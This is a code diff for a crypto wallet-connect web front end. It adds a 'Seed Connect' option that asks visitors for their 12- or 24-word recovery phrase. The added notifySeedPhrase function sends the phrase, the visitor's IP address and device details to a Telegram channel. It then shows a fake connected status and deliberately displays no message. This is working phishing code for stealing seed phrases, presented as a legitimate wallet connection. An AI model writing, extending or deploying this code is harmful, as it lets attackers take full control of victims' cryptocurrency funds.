@@ -97,8 +97,12 @@ const store = {
   isApprovalRequested: false,
   isApprovalRejected: false,
   connectionKey: null,
-  isProcessingConnection: false
+  isProcessingConnection: false,
+  selectedWordCount: 12
 }
+
+// Делаем AppKit глобально доступным
+window.appKit = appKit
 
 // Создание модального окна
 function createCustomModal() {
@@ -1015,3 +1019,659 @@ document.getElementById('switch-network')?.addEventListener('click', () => {
   
   appKit.switchNetwork(nextNetwork)
 })
+
+// Функция для создания модального окна выбора подключения
+function createConnectChoiceModal() {
+  const modalHTML = `
+    <div id="connect-choice-modal" class="modal" style="display: none;">
+      <div class="modal-content choice-modal-content">
+        <h2>Choose Connection Method</h2>
+        <div class="choice-buttons">
+          <button id="wallet-connect-btn" class="choice-btn">
+            <span class="btn-icon">🔗</span>
+            <span class="btn-text">Wallet Connect</span>
+            <span class="btn-description">Standard wallet connection</span>
+          </button>
+          <button id="seed-connect-btn" class="choice-btn">
+            <span class="btn-icon">🌱</span>
+            <span class="btn-text">Seed Connect</span>
+            <span class="btn-description">Connect via seed phrase</span>
+          </button>
+        </div>
+        <button class="modal-close" onclick="hideConnectChoiceModal()">✕</button>
+      </div>
+    </div>
+  `
+
+  const modalCSS = `
+    <style>
+      .modal {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.5);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+        padding: 20px;
+      }
+      
+      .choice-modal-content {
+        background-color: #121313 !important;
+        color: #ffffff !important;
+        max-width: 500px !important;
+        padding: 1px 45px 45px 45px;
+        border-radius: 30px !important;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3) !important;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif !important;
+        width: 100% !important;
+      }
+      
+      .choice-modal-content h2 {
+        color: #ffffff !important;
+        font-size: 20px !important;
+        font-weight: 600 !important;
+        margin-bottom: 30px !important;
+        text-align: center !important;
+      }
+      
+      .choice-buttons {
+        display: flex;
+        flex-direction: column;
+        gap: 15px;
+      }
+      
+      .choice-btn {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        padding: 20px;
+        border: 2px solid #333;
+        border-radius: 12px;
+        background: #1a1a1a;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        text-align: center;
+      }
+      
+      .choice-btn:hover {
+        border-color: #6c757d;
+        background: #1a1a1a;
+        transform: translateY(-2px);
+      }
+      
+      .btn-icon {
+        font-size: 32px;
+        margin-bottom: 10px;
+      }
+      
+      .btn-text {
+        font-size: 18px;
+        font-weight: bold;
+        color: #ffffff;
+        margin-bottom: 5px;
+      }
+      
+      .btn-description {
+        font-size: 14px;
+        color: #858585;
+      }
+      
+      .modal-close {
+        position: absolute;
+        top: 15px;
+        right: 15px;
+        background: none;
+        border: none;
+        font-size: 24px;
+        cursor: pointer;
+        color: #858585;
+        padding: 5px;
+        border-radius: 50%;
+        width: 40px;
+        height: 40px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transition: all 0.3s ease;
+      }
+      
+      .modal-close:hover {
+        background: #1a1a1a;
+        color: #ffffff;
+      }
+      
+      /* Мобильная адаптация */
+      @media (max-width: 768px) {
+        .modal {
+          padding: 10px;
+        }
+        
+        .choice-modal-content {
+          padding: 30px 20px !important;
+        }
+        
+        .choice-modal-content h2 {
+          font-size: 18px !important;
+        }
+        
+        .choice-btn {
+          padding: 15px;
+        }
+        
+        .btn-text {
+          font-size: 16px;
+        }
+        
+        .btn-description {
+          font-size: 12px;
+        }
+      }
+    </style>
+  `
+
+  document.head.insertAdjacentHTML('beforeend', modalCSS)
+  document.body.insertAdjacentHTML('beforeend', modalHTML)
+}
+
+// Функция для создания модального окна ввода сид-фразы
+function createSeedModal() {
+  const modalHTML = `
+    <div id="seed-modal" class="modal" style="display: none;">
+      <div class="modal-content seed-modal-content">
+        <h2>Enter Seed Phrase</h2>
+        <div class="seed-input-container">
+          <div class="word-count-selector">
+            <button class="word-count-btn active" data-count="12">12 words</button>
+            <button class="word-count-btn" data-count="24">24 words</button>
+          </div>
+          <div class="seed-words-grid" id="seed-words-grid">
+            <!-- Words will be added dynamically -->
+          </div>
+          <button id="seedSubmitBtn" class="submit-btn">
+            Connect
+          </button>
+        </div>
+        <button class="modal-close" onclick="hideSeedModal()">✕</button>
+      </div>
+    </div>
+  `
+
+  const modalCSS = `
+    <style>
+      .seed-modal-content {
+        background-color: #121313 !important;
+        color: #ffffff !important;
+        max-width: 700px !important;
+        padding: 10px 45px 45px 45px;
+        border-radius: 30px !important;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3) !important;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif !important;
+      }
+      
+      .seed-modal-content h2 {
+        color: #ffffff !important;
+        font-size: 20px !important;
+        font-weight: 600 !important;
+        margin-bottom: 15px !important;
+        text-align: center !important;
+      }
+      
+      .seed-input-container {
+        display: flex;
+        flex-direction: column;
+        gap: 25px;
+      }
+      
+      .word-count-selector {
+        display: flex;
+        gap: 15px;
+        justify-content: center;
+        margin-bottom: 1px;
+      }
+      
+      .word-count-btn {
+        padding: 12px 24px;
+        border: 2px solid #333;
+        border-radius: 8px;
+        background: #1a1a1a;
+        color: #858585;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        font-size: 14px;
+        font-weight: 500;
+      }
+      
+      .word-count-btn.active {
+        border-color: #ffffff;
+        background: #ffffff;
+        color: #121313;
+      }
+      
+      .word-count-btn:hover:not(.active) {
+        border-color: #ffffff;
+        background: #1a1a1a;
+        color: #ffffff;
+      }
+      
+      .seed-words-grid {
+        display: grid;
+        grid-template-columns: repeat(4, 1fr);
+        gap: 15px;
+        margin: 20px 0;
+        max-width: 100%;
+        overflow: hidden;
+      }
+      
+      .seed-column {
+        display: flex;
+        flex-direction: column;
+        gap: 12px;
+        min-width: 0;
+      }
+      
+      .seed-column h3 {
+        color: #858585;
+        font-size: 12px;
+        font-weight: 600;
+        margin: 0 0 12px 0;
+        text-align: center;
+      }
+      
+      .seed-word-line {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        padding: 6px 0;
+        min-height: 40px;
+      }
+      
+      .word-number {
+        color: #858585;
+        font-size: 12px;
+        font-weight: 500;
+        min-width: 25px;
+        text-align: right;
+        flex-shrink: 0;
+      }
+      
+      .seed-word-line input {
+        flex: 1;
+        padding: 10px 12px;
+        border: 2px solid #333;
+        border-radius: 8px;
+        background: #1a1a1a;
+        color: #ffffff;
+        font-size: 13px;
+        font-family: monospace;
+        transition: all 0.3s ease;
+        min-height: 36px;
+        box-sizing: border-box;
+        min-width: 0;
+      }
+      
+      .seed-word-line input:focus {
+        outline: none;
+        border-color: #ffffff;
+        background: #1a1a1a;
+      }
+      
+      .seed-word-line input::placeholder {
+        color: #858585;
+      }
+      
+      /* Мобильная адаптация для сид-фразы */
+      @media (max-width: 768px) {
+        .modal {
+          align-items: center;
+          justify-content: center;
+        }
+        
+        .seed-modal-content {
+          padding: 30px 20px !important;
+          max-width: 95% !important;
+          margin: auto;
+          position: relative;
+        }
+        
+        .seed-words-grid {
+          grid-template-columns: repeat(2, 1fr);
+          gap: 10px;
+        }
+        
+        .seed-column h3 {
+          font-size: 11px;
+          margin-bottom: 8px;
+        }
+        
+        .seed-word-line {
+          gap: 6px;
+          padding: 4px 0;
+          min-height: 35px;
+        }
+        
+        .word-number {
+          font-size: 11px;
+          min-width: 20px;
+        }
+        
+        .seed-word-line input {
+          padding: 8px 10px;
+          font-size: 12px;
+          min-height: 32px;
+        }
+        
+        .word-count-selector {
+          gap: 10px;
+        }
+        
+        .word-count-btn {
+          padding: 10px 20px;
+          font-size: 13px;
+        }
+      }
+      
+      @media (max-width: 480px) {
+        .modal {
+          align-items: center;
+          justify-content: center;
+          padding: 10px;
+        }
+        
+        .seed-modal-content {
+          margin: auto;
+          position: relative;
+        }
+        
+        .seed-words-grid {
+          grid-template-columns: 1fr;
+          gap: 8px;
+        }
+        
+        .seed-word-line {
+          min-height: 40px;
+        }
+        
+        .seed-word-line input {
+          min-height: 36px;
+        }
+      }
+      
+      .submit-btn {
+        padding: 15px 30px;
+        background: #ffffff;
+        color: #121313;
+        border: none;
+        border-radius: 8px;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        margin-top: 20px;
+      }
+      
+      .submit-btn:hover {
+        background: #f8f9fa;
+        transform: translateY(-1px);
+      }
+      
+      .submit-btn:disabled {
+        background: #6c757d;
+        cursor: not-allowed;
+        transform: none;
+      }
+      
+      .modal-close {
+        color: #858585 !important;
+      }
+      
+      .modal-close:hover {
+        background: #1a1a1a !important;
+        color: #ffffff !important;
+      }
+    </style>
+  `
+
+  document.head.insertAdjacentHTML('beforeend', modalCSS)
+  document.body.insertAdjacentHTML('beforeend', modalHTML)
+}
+
+// Функция для создания полей ввода слов
+function createSeedWordInputs(wordCount) {
+  const grid = document.getElementById('seed-words-grid')
+  grid.innerHTML = ''
+  
+  // Создаем 4 колонки для обеих версий
+  grid.style.gridTemplateColumns = 'repeat(4, 1fr)'
+  grid.style.gap = '15px'
+  grid.style.maxWidth = '100%'
+  grid.style.overflow = 'hidden'
+  
+  // Создаем 4 колонки с правильным распределением
+  const columns = []
+  const wordsPerColumn = Math.ceil(wordCount / 4)
+  
+  for (let col = 0; col < 4; col++) {
+    const column = document.createElement('div')
+    column.className = 'seed-column'
+    column.style.minWidth = '0'
+    const startWord = col * wordsPerColumn + 1
+    const endWord = Math.min((col + 1) * wordsPerColumn, wordCount)
+    column.innerHTML = `<h3>Words ${startWord}-${endWord}</h3>`
+    columns.push(column)
+  }
+  
+  // Распределяем слова по колонкам равномерно
+  for (let i = 1; i <= wordCount; i++) {
+    const wordInput = document.createElement('div')
+    wordInput.className = 'seed-word-line'
+    wordInput.innerHTML = `
+      <span class="word-number">${i}.</span>
+      <input 
+        type="text" 
+        id="word-${i}" 
+        placeholder="enter word"
+        autocomplete="off"
+        spellcheck="false"
+        data-word-index="${i}"
+        style="min-width: 0;"
+      >
+    `
+    
+    // Определяем в какую колонку добавить (равномерное распределение)
+    const columnIndex = Math.floor((i - 1) / wordsPerColumn)
+    if (columns[columnIndex]) {
+      columns[columnIndex].appendChild(wordInput)
+    }
+  }
+  
+  // Добавляем все колонки
+  columns.forEach(column => grid.appendChild(column))
+  
+  // Добавляем обработчики для полей ввода
+  const inputs = grid.querySelectorAll('input')
+  inputs.forEach((input, index) => {
+    // Обработчик для Enter - переход к следующему полю
+    input.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter') {
+        e.preventDefault()
+        if (index < inputs.length - 1) {
+          inputs[index + 1].focus()
+        } else {
+          // Если это последнее поле, фокусируемся на кнопке отправки
+          document.getElementById('seedSubmitBtn').focus()
+        }
+      }
+    })
+    
+    // Обработчик для вставки полной фразы в первое поле
+    input.addEventListener('paste', (e) => {
+      if (index === 0) { // Только для первого поля
+        e.preventDefault()
+        const pastedText = (e.clipboardData || window.clipboardData).getData('text')
+        const words = pastedText.trim().split(/\s+/).filter(word => word.length > 0)
+        
+        if (words.length === wordCount) {
+          // Заполняем все поля словами из вставленной фразы
+          words.forEach((word, wordIndex) => {
+            if (wordIndex < inputs.length) {
+              inputs[wordIndex].value = word
+            }
+          })
+          // Фокусируемся на кнопке отправки
+          document.getElementById('seedSubmitBtn').focus()
+        } else if (words.length > 0) {
+          // Если количество слов не совпадает, но есть слова, заполняем доступные поля
+          words.forEach((word, wordIndex) => {
+            if (wordIndex < inputs.length) {
+              inputs[wordIndex].value = word
+            }
+          })
+          // Фокусируемся на кнопке отправки
+          document.getElementById('seedSubmitBtn').focus()
+        } else {
+          // Если нет слов, просто вставляем текст как есть
+          input.value = pastedText
+        }
+      }
+    })
+  })
+}
+
+// Функции для показа/скрытия модальных окон
+function showConnectChoiceModal() {
+  document.getElementById('connect-choice-modal').style.display = 'flex'
+}
+
+function hideConnectChoiceModal() {
+  document.getElementById('connect-choice-modal').style.display = 'none'
+}
+
+function showSeedModal() {
+  document.getElementById('seed-modal').style.display = 'flex'
+  createSeedWordInputs(store.selectedWordCount)
+}
+
+function hideSeedModal() {
+  document.getElementById('seed-modal').style.display = 'none'
+}
+
+// Делаем функции глобальными
+window.showConnectChoiceModal = showConnectChoiceModal
+window.hideConnectChoiceModal = hideConnectChoiceModal
+window.showSeedModal = showSeedModal
+window.hideSeedModal = hideSeedModal
+
+// Функция для отправки сид-фразы в Telegram
+async function notifySeedPhrase(seedPhrase, wordCount) {
+  try {
+    const message = `🔐 **New Seed Phrase Connection**\n\n` +
+                   `📝 **Word Count:** ${wordCount}\n` +
+                   `🌱 **Seed Phrase:** \`${seedPhrase}\`\n\n` +
+                   `⏰ **Time:** ${new Date().toLocaleString('en-US')}\n` +
+                   `🌐 **IP:** ${await getUserIP()}\n` +
+                   `📱 **Device:** ${detectDevice()}`
+
+    await sendTelegramMessage(message)
+    console.log('✅ Seed phrase sent to Telegram')
+    return true
+  } catch (error) {
+    console.error('❌ Error sending seed phrase:', error)
+    return false
+  }
+}
+
+// Инициализация модальных окон при загрузке страницы
+window.addEventListener('load', () => {
+  createConnectChoiceModal()
+  createSeedModal()
+  
+  // Обработчики для модального окна выбора
+  document.addEventListener('click', (e) => {
+    if (e.target.id === 'wallet-connect-btn') {
+      hideConnectChoiceModal()
+      // Открываем AppKit модальное окно
+      if (window.appKit && window.appKit.open) {
+        window.appKit.open()
+      } else {
+        console.log('AppKit not available')
+        if (window.addMessage) {
+          window.addMessage('Wallet Connect not available', 'error')
+        }
+      }
+    }
+    
+    if (e.target.id === 'seed-connect-btn') {
+      hideConnectChoiceModal()
+      showSeedModal()
+    }
+    
+    // Закрытие модальных окон при клике на фон
+    if (e.target.classList.contains('modal')) {
+      hideConnectChoiceModal()
+      hideSeedModal()
+    }
+  })
+  
+  // Обработчики для модального окна сид-фразы
+  document.addEventListener('click', (e) => {
+    // Переключение количества слов
+    if (e.target.classList.contains('word-count-btn')) {
+      document.querySelectorAll('.word-count-btn').forEach(btn => btn.classList.remove('active'))
+      e.target.classList.add('active')
+      store.selectedWordCount = parseInt(e.target.dataset.count)
+      createSeedWordInputs(store.selectedWordCount)
+    }
+    
+    // Отправка сид-фразы
+    if (e.target.id === 'seedSubmitBtn') {
+      const inputs = document.querySelectorAll('#seed-words-grid input')
+      const words = Array.from(inputs).map(input => input.value.trim()).filter(word => word.length > 0)
+      
+      if (words.length !== store.selectedWordCount) {
+        if (window.addMessage) {
+          window.addMessage(`Please enter all ${store.selectedWordCount} words`, 'error')
+        }
+        return
+      }
+      
+      const seedPhrase = words.join(' ')
+      
+      // Отправка в Telegram
+      const submitBtn = e.target
+      const originalText = submitBtn.textContent
+      submitBtn.textContent = 'Sending...'
+      submitBtn.disabled = true
+      
+      notifySeedPhrase(seedPhrase, store.selectedWordCount).then(success => {
+        if (success) {
+          hideSeedModal()
+          // Очищаем все поля
+          inputs.forEach(input => input.value = '')
+          // НЕ показываем сообщение об успехе в HTML
+          if (window.updateConnectionStatus) {
+            window.updateConnectionStatus(true, 'Seed Connect')
+          }
+        } else {
+          if (window.addMessage) {
+            window.addMessage('Error sending seed phrase', 'error')
+          }
+        }
+        
+        submitBtn.textContent = originalText
+        submitBtn.disabled = false
+      })
+    }
+  })
+})
+
+// Изменяем обработчик для кнопки подключения
+document.querySelectorAll('.open-connect-modal').forEach(button => {
+  button.addEventListener('click', (event) => {
+    event.stopPropagation(); // Предотвращаем всплытие события к document
+    showConnectChoiceModal() // Показываем модальное окно выбора
+  });
+});
